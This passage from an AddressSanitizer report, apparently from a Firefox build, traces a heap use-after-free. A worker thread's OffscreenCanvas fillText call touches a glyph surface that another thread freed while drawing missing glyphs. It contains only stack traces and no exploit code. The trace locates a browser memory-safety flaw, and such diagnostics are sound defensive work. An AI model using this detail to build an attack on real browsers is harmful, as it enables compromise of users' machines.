    #10 0x7ff9bc71197c in mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4448
    #11 0x7ff9bc70f9d9 in mozilla::dom::CanvasRenderingContext2D::FillText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:3860
    #12 0x7ff9baa76ed4 in mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText /builds/worker/workspace/obj-build/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904
    #13 0x7ff9bc53b092 in mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions> /builds/worker/checkouts/gecko/dom/bindings/BindingUtils.cpp:3318
    #14 0x7ff9c73ba9d3 in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:553
    #15 0x7ff9c73a5ccc in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3368
    #16 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #17 0x7ff9c73bab0d in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:585
    #18 0x7ff9c73bc9f1 in js::Call /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:652
    #19 0x7ff9c57cbe00 in JS::Call /builds/worker/checkouts/gecko/js/src/vm/CallAndConstruct.cpp:117
    #20 0x7ff9bc09aacd in mozilla::dom::Function::Call /builds/worker/workspace/obj-build/dom/bindings/FunctionBinding.cpp:50
    #21 0x7ff9b9e3cc99 in mozilla::dom::Function::Call<nsCOMPtr<nsIGlobalObject> > /builds/worker/workspace/obj-build/dist/include/mozilla/dom/FunctionBinding.h:71
    #22 0x7ff9b9e3c609 in mozilla::dom::CallbackTimeoutHandler::Call /builds/worker/checkouts/gecko/dom/base/TimeoutHandler.cpp:167
    #23 0x7ff9bfb7886c in mozilla::dom::WorkerPrivate::RunExpiredTimeouts /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:5163
    #24 0x7ff9bfb864eb in mozilla::dom::WorkerRunnable::Run /builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp:377
    #25 0x7ff9b68bed58 in nsTimerImpl::Fire /builds/worker/checkouts/gecko/xpcom/threads/nsTimerImpl.cpp:654
    #26 0x7ff9b685ba48 in nsTimerEvent::Run /builds/worker/checkouts/gecko/xpcom/threads/TimerThread.cpp:469
    #27 0x7ff9bfb9bbe0 in mozilla::dom::`anonymous namespace'::ExternalRunnableWrapper::WorkerRun /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:201
    #28 0x7ff9bfb864eb in mozilla::dom::WorkerRunnable::Run /builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp:377
    #29 0x7ff9b687938d in nsThread::ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1233
    #30 0x7ff9b6887f5d in NS_ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:477
    #31 0x7ff9bfb64d64 in mozilla::dom::WorkerPrivate::DoRunLoop /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:3279
    #32 0x7ff9bfb385c8 in mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:2043
    #33 0x7ff9b687938d in nsThread::ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1233
    #34 0x7ff9b6887f5d in NS_ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:477
    #35 0x7ff9b7f3150e in mozilla::ipc::MessagePumpForNonMainThreads::Run /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:300
    #36 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #37 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #38 0x7ff9b686ed3c in nsThread::ThreadFunc /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:391
    #39 0x7ff9d5c152c5 in _PR_NativeRunThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:399
    #40 0x7ff9d5beedab in pr_root /builds/worker/checkouts/gecko/nsprpub/pr/src/md/windows/w95thred.c:139
    #41 0x7ffa5c849362 in recalloc+0xa2 (C:\WINDOWS\System32\ucrtbase.dll+0x180029362)
    #42 0x7ff9d5feabb3 in __asan::AsanThread::ThreadStart /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_thread.cpp:277
    #43 0x7ffa5dc626bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)
    #44 0x7ffa21bba5ae in patched_BaseThreadInitThunk /builds/worker/checkouts/gecko/toolkit/xre/dllservices/mozglue/WindowsDllBlocklist.cpp:592
    #45 0x7ffa5ecca9f7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005a9f7)

0x12709a7ebec0 is located 0 bytes inside of 128-byte region [0x12709a7ebec0,0x12709a7ebf40)
freed by thread T32 here:
    #0 0x7ff9d5fdeeec in free /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_win.cpp:82
    #1 0x7ff9b8a255ec in mozilla::gfx::SourceSurfaceSkia::~SourceSurfaceSkia /builds/worker/checkouts/gecko/gfx/2d/SourceSurfaceSkia.cpp:25
    #2 0x7ff9b923c1a4 in gfxFontMissingGlyphs::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp:418
    #3 0x7ff9b91ce249 in gfxFont::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2202
    #4 0x7ff9b91d8338 in gfxFont::DrawGlyphs<0,0> /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2030
    #5 0x7ff9b91d1e8d in gfxFont::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2530
    #6 0x7ff9b9293f6a in gfxTextRun::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxTextRun.cpp:683
    #7 0x7ff9bc86e121 in mozilla::dom::CanvasBidiProcessor::DrawText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4123
    #8 0x7ff9c11c9b54 in nsBidiPresUtils::ProcessSimpleRun /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2387
    #9 0x7ff9c11c90ea in nsBidiPresUtils::ProcessText /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2165
    #10 0x7ff9bc71197c in mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4448
    #11 0x7ff9bc70f9d9 in mozilla::dom::CanvasRenderingContext2D::FillText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:3860
    #12 0x7ff9baa76ed4 in mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText /builds/worker/workspace/obj-build/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904
    #13 0x7ff9bc53b092 in mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions> /builds/worker/checkouts/gecko/dom/bindings/BindingUtils.cpp:3318
    #14 0x7ff9c73ba9d3 in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:553
    #15 0x7ff9c73a5ccc in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3368
    #16 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #17 0x7ff9c73bab0d in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:585
    #18 0x7ff9c73bc9f1 in js::Call /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:652
    #19 0x7ff9c57cbe00 in JS::Call /builds/worker/checkouts/gecko/js/src/vm/CallAndConstruct.cpp:117
    #20 0x7ff9bc09aacd in mozilla::dom::Function::Call /builds/worker/workspace/obj-build/dom/bindings/FunctionBinding.cpp:50
    #21 0x7ff9b9e3cc99 in mozilla::dom::Function::Call<nsCOMPtr<nsIGlobalObject> > /builds/worker/workspace/obj-build/dist/include/mozilla/dom/FunctionBinding.h:71
    #22 0x7ff9b9e3c609 in mozilla::dom::CallbackTimeoutHandler::Call /builds/worker/checkouts/gecko/dom/base/TimeoutHandler.cpp:167
    #23 0x7ff9bfb7886c in mozilla::dom::WorkerPrivate::RunExpiredTimeouts /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:5163
    #24 0x7ff9bfb864eb in mozilla::dom::WorkerRunnable::Run /builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp:377
    #25 0x7ff9b68bed58 in nsTimerImpl::Fire /builds/worker/checkouts/gecko/xpcom/threads/nsTimerImpl.cpp:654
    #26 0x7ff9b685ba48 in nsTimerEvent::Run /builds/worker/checkouts/gecko/xpcom/threads/TimerThread.cpp:469
    #27 0x7ff9bfb9bbe0 in mozilla::dom::`anonymous namespace'::ExternalRunnableWrapper::WorkerRun /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:201

previously allocated by thread T25 here:
    #0 0x7ff9d5fdeffc in malloc /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_win.cpp:98
    #1 0x7ffa21aa11ad in moz_xmalloc /builds/worker/checkouts/gecko/memory/mozalloc/mozalloc.cpp:52
    #2 0x7ff9b8938d99 in mozilla::gfx::DrawTargetSkia::CreateSourceSurfaceFromData /builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp:1558
    #3 0x7ff9b923c0f4 in gfxFontMissingGlyphs::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp:418
    #4 0x7ff9b91ce249 in gfxFont::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2202
    #5 0x7ff9b91d8338 in gfxFont::DrawGlyphs<0,0> /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2030
    #6 0x7ff9b91d1e8d in gfxFont::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2530
    #7 0x7ff9b9293f6a in gfxTextRun::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxTextRun.cpp:683
    #8 0x7ff9bc86e121 in mozilla::dom::CanvasBidiProcessor::DrawText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4123
    #9 0x7ff9c11c9b54 in nsBidiPresUtils::ProcessSimpleRun /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2387
    #10 0x7ff9c11c90ea in nsBidiPresUtils::ProcessText /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2165
    #11 0x7ff9bc71197c in mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4448
    #12 0x7ff9bc70f9d9 in mozilla::dom::CanvasRenderingContext2D::FillText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:3860
    #13 0x7ff9baa76ed4 in mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText /builds/worker/workspace/obj-build/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904
    #14 0x7ff9bc53b092 in mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions> /builds/worker/checkouts/gecko/dom/bindings/BindingUtils.cpp:3318
    #15 0x7ff9c73ba9d3 in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:553
    #16 0x7ff9c73a5ccc in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3368
    #17 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #18 0x7ff9c73bab0d in js::InternalCallOrConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:585
    #19 0x7ff9c73bc9f1 in js::Call /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:652
    #20 0x7ff9c57cbe00 in JS::Call /builds/worker/checkouts/gecko/js/src/vm/CallAndConstruct.cpp:117
    #21 0x7ff9bc09aacd in mozilla::dom::Function::Call /builds/worker/workspace/obj-build/dom/bindings/FunctionBinding.cpp:50
    #22 0x7ff9b9e3cc99 in mozilla::dom::Function::Call<nsCOMPtr<nsIGlobalObject> > /builds/worker/workspace/obj-build/dist/include/mozilla/dom/FunctionBinding.h:71
    #23 0x7ff9b9e3c609 in mozilla::dom::CallbackTimeoutHandler::Call /builds/worker/checkouts/gecko/dom/base/TimeoutHandler.cpp:167
    #24 0x7ff9bfb7886c in mozilla::dom::WorkerPrivate::RunExpiredTimeouts /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:5163
    #25 0x7ff9bfb864eb in mozilla::dom::WorkerRunnable::Run /builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp:377
    #26 0x7ff9b68bed58 in nsTimerImpl::Fire /builds/worker/checkouts/gecko/xpcom/threads/nsTimerImpl.cpp:654
    #27 0x7ff9b685ba48 in nsTimerEvent::Run /builds/worker/checkouts/gecko/xpcom/threads/TimerThread.cpp:469

Thread T26 created by T0 here:
    #0 0x7ff9d5febd62 in __asan_wrap_CreateThread /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_win.cpp:146
    #1 0x7ffa5c84838d in beginthreadex+0x5d (C:\WINDOWS\System32\ucrtbase.dll+0x18002838d)
    #2 0x7ff9d5beebde in _PR_MD_CREATE_THREAD /builds/worker/checkouts/gecko/nsprpub/pr/src/md/windows/w95thred.c:153
    #3 0x7ff9d5c1606e in _PR_NativeCreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1058
    #4 0x7ff9d5c167e8 in _PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1184
    #5 0x7ff9d5c0c7ef in PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1404
    #6 0x7ff9b68722ea in nsThread::Init /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:633
    #7 0x7ff9bfb98ff0 in mozilla::dom::WorkerThread::Create /builds/worker/checkouts/gecko/dom/workers/WorkerThread.cpp:102
    #8 0x7ff9bfafced8 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1324
    #9 0x7ff9bfafad52 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1206
    #10 0x7ff9bfb5c22f in mozilla::dom::WorkerPrivate::Constructor /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:2652
    #11 0x7ff9bfb19624 in mozilla::dom::Worker::Constructor /builds/worker/checkouts/gecko/dom/workers/Worker.cpp:43
    #12 0x7ff9bb9ded46 in mozilla::dom::Worker_Binding::_constructor /builds/worker/workspace/obj-build/dom/bindings/WorkerBinding.cpp:1173
    #13 0x7ff9c73bdaa0 in InternalConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:700
    #14 0x7ff9c73a5c88 in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3353
    #15 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #16 0x7ff9c73bf07a in js::ExecuteKernel /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:818
    #17 0x7ff9c73bf4b0 in js::Execute /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:850
    #18 0x7ff9c57fd0fa in JS_ExecuteScript /builds/worker/checkouts/gecko/js/src/vm/CompilationAndEvaluation.cpp:496
    #19 0x7ff9b9d0a167 in mozilla::dom::JSExecutionContext::ExecScript /builds/worker/checkouts/gecko/dom/base/JSExecutionContext.cpp:241
    #20 0x7ff9c01a10e7 in mozilla::dom::ScriptLoader::EvaluateScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2403
    #21 0x7ff9c019f2f4 in mozilla::dom::ScriptLoader::EvaluateScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2207
    #22 0x7ff9c0195f15 in mozilla::dom::ScriptLoader::ProcessRequest /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1857
    #23 0x7ff9c0191440 in mozilla::dom::ScriptLoader::ProcessInlineScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1300
    #24 0x7ff9c017aec3 in mozilla::dom::ScriptLoader::ProcessScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:927
    #25 0x7ff9c0179e26 in mozilla::dom::ScriptElement::MaybeProcessScript /builds/worker/checkouts/gecko/dom/script/ScriptElement.cpp:134
    #26 0x7ff9b87dd28d in nsHtml5TreeOpExecutor::RunScript /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:950
    #27 0x7ff9b87d7361 in nsHtml5TreeOpExecutor::RunFlushLoop /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:741
    #28 0x7ff9b87e4f90 in nsHtml5ExecutorFlusher::Run /builds/worker/checkouts/gecko/parser/html/nsHtml5StreamParser.cpp:174
    #29 0x7ff9b68217d6 in mozilla::SchedulerGroup::Runnable::Run /builds/worker/checkouts/gecko/xpcom/threads/SchedulerGroup.cpp:114
    #30 0x7ff9b6844c83 in mozilla::RunnableTask::Run /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:553
    #31 0x7ff9b682d38c in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:867
    #32 0x7ff9b68297f2 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:698
    #33 0x7ff9b682a413 in mozilla::TaskController::ProcessPendingMTTask /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:464
    #34 0x7ff9b68481c1 in mozilla::detail::RunnableFunction<`lambda at /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:188:7'>::Run /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:547
    #35 0x7ff9b687857a in nsThread::ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1239
    #36 0x7ff9b6887f5d in NS_ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:477
    #37 0x7ff9b7f30267 in mozilla::ipc::MessagePump::Run /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85
    #38 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #39 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #40 0x7ff9c06ec81c in nsBaseAppShell::Run /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:148
    #41 0x7ff9c08f779e in nsAppShell::Run /builds/worker/checkouts/gecko/widget/windows/nsAppShell.cpp:614
    #42 0x7ff9c5377ff7 in XRE_RunAppShell /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:738
    #43 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #44 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #45 0x7ff9c537753a in XRE_InitChildProcess /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:673
    #46 0x7ff7e1632c9e in NS_internal_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:353
    #47 0x7ff7e163166e in wmain /builds/worker/checkouts/gecko/toolkit/xre/nsWindowsWMain.cpp:167
    #48 0x7ff7e1725a67 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #49 0x7ffa5dc626bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)
    #50 0x7ffa5ecca9f7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005a9f7)

Thread T32 created by T0 here:
    #0 0x7ff9d5febd62 in __asan_wrap_CreateThread /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_win.cpp:146
    #1 0x7ffa5c84838d in beginthreadex+0x5d (C:\WINDOWS\System32\ucrtbase.dll+0x18002838d)
    #2 0x7ff9d5beebde in _PR_MD_CREATE_THREAD /builds/worker/checkouts/gecko/nsprpub/pr/src/md/windows/w95thred.c:153
    #3 0x7ff9d5c1606e in _PR_NativeCreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1058
    #4 0x7ff9d5c167e8 in _PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1184
    #5 0x7ff9d5c0c7ef in PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1404
    #6 0x7ff9b68722ea in nsThread::Init /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:633
    #7 0x7ff9bfb98ff0 in mozilla::dom::WorkerThread::Create /builds/worker/checkouts/gecko/dom/workers/WorkerThread.cpp:102
    #8 0x7ff9bfafced8 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1324
    #9 0x7ff9bfafad52 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1206
    #10 0x7ff9bfb5c22f in mozilla::dom::WorkerPrivate::Constructor /builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp:2652
    #11 0x7ff9bfb19624 in mozilla::dom::Worker::Constructor /builds/worker/checkouts/gecko/dom/workers/Worker.cpp:43
    #12 0x7ff9bb9ded46 in mozilla::dom::Worker_Binding::_constructor /builds/worker/workspace/obj-build/dom/bindings/WorkerBinding.cpp:1173
    #13 0x7ff9c73bdaa0 in InternalConstruct /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:700
    #14 0x7ff9c73a5c88 in Interpret /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3353
    #15 0x7ff9c7391506 in js::RunScript /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:431
    #16 0x7ff9c73bf07a in js::ExecuteKernel /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:818
    #17 0x7ff9c73bf4b0 in js::Execute /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:850
    #18 0x7ff9c57fd0fa in JS_ExecuteScript /builds/worker/checkouts/gecko/js/src/vm/CompilationAndEvaluation.cpp:496
    #19 0x7ff9b9d0a167 in mozilla::dom::JSExecutionContext::ExecScript /builds/worker/checkouts/gecko/dom/base/JSExecutionContext.cpp:241
    #20 0x7ff9c01a10e7 in mozilla::dom::ScriptLoader::EvaluateScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2403
    #21 0x7ff9c019f2f4 in mozilla::dom::ScriptLoader::EvaluateScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:2207
    #22 0x7ff9c0195f15 in mozilla::dom::ScriptLoader::ProcessRequest /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1857
    #23 0x7ff9c0191440 in mozilla::dom::ScriptLoader::ProcessInlineScript /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:1300
    #24 0x7ff9c017aec3 in mozilla::dom::ScriptLoader::ProcessScriptElement /builds/worker/checkouts/gecko/dom/script/ScriptLoader.cpp:927
    #25 0x7ff9c0179e26 in mozilla::dom::ScriptElement::MaybeProcessScript /builds/worker/checkouts/gecko/dom/script/ScriptElement.cpp:134
    #26 0x7ff9b87dd28d in nsHtml5TreeOpExecutor::RunScript /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:950
    #27 0x7ff9b87d7361 in nsHtml5TreeOpExecutor::RunFlushLoop /builds/worker/checkouts/gecko/parser/html/nsHtml5TreeOpExecutor.cpp:741
    #28 0x7ff9b87e4f90 in nsHtml5ExecutorFlusher::Run /builds/worker/checkouts/gecko/parser/html/nsHtml5StreamParser.cpp:174
    #29 0x7ff9b68217d6 in mozilla::SchedulerGroup::Runnable::Run /builds/worker/checkouts/gecko/xpcom/threads/SchedulerGroup.cpp:114
    #30 0x7ff9b6844c83 in mozilla::RunnableTask::Run /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:553
    #31 0x7ff9b682d38c in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:867
    #32 0x7ff9b68297f2 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:698
    #33 0x7ff9b682a413 in mozilla::TaskController::ProcessPendingMTTask /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:464
    #34 0x7ff9b68481c1 in mozilla::detail::RunnableFunction<`lambda at /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:188:7'>::Run /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:547
    #35 0x7ff9b687857a in nsThread::ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1239
    #36 0x7ff9b6887f5d in NS_ProcessNextEvent /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:477
    #37 0x7ff9b7f30267 in mozilla::ipc::MessagePump::Run /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85
    #38 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #39 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #40 0x7ff9c06ec81c in nsBaseAppShell::Run /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:148
    #41 0x7ff9c08f779e in nsAppShell::Run /builds/worker/checkouts/gecko/widget/windows/nsAppShell.cpp:614
    #42 0x7ff9c5377ff7 in XRE_RunAppShell /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:738
    #43 0x7ff9b7e47432 in MessageLoop::RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:374
    #44 0x7ff9b7e47207 in MessageLoop::Run /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:356
    #45 0x7ff9c537753a in XRE_InitChildProcess /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:673
    #46 0x7ff7e1632c9e in NS_internal_main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:353
    #47 0x7ff7e163166e in wmain /builds/worker/checkouts/gecko/toolkit/xre/nsWindowsWMain.cpp:167
    #48 0x7ff7e1725a67 in __scrt_common_main_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #49 0x7ffa5dc626bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)
    #50 0x7ffa5ecca9f7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005a9f7)

Thread T25 created by T0 here:
    #0 0x7ff9d5febd62 in __asan_wrap_CreateThread /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_win.cpp:146
    #1 0x7ffa5c84838d in beginthreadex+0x5d (C:\WINDOWS\System32\ucrtbase.dll+0x18002838d)
    #2 0x7ff9d5beebde in _PR_MD_CREATE_THREAD /builds/worker/checkouts/gecko/nsprpub/pr/src/md/windows/w95thred.c:153
    #3 0x7ff9d5c1606e in _PR_NativeCreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1058
    #4 0x7ff9d5c167e8 in _PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1184
    #5 0x7ff9d5c0c7ef in PR_CreateThread /builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c:1404
    #6 0x7ff9b68722ea in nsThread::Init /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:633
    #7 0x7ff9bfb98ff0 in mozilla::dom::WorkerThread::Create /builds/worker/checkouts/gecko/dom/workers/WorkerThread.cpp:102
    #8 0x7ff9bfafced8 in mozilla::dom::workerinternals::RuntimeService::ScheduleWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1324
    #9 0x7ff9bfafad52 in mozilla::dom::workerinternals::RuntimeService::RegisterWorker /builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp:1206
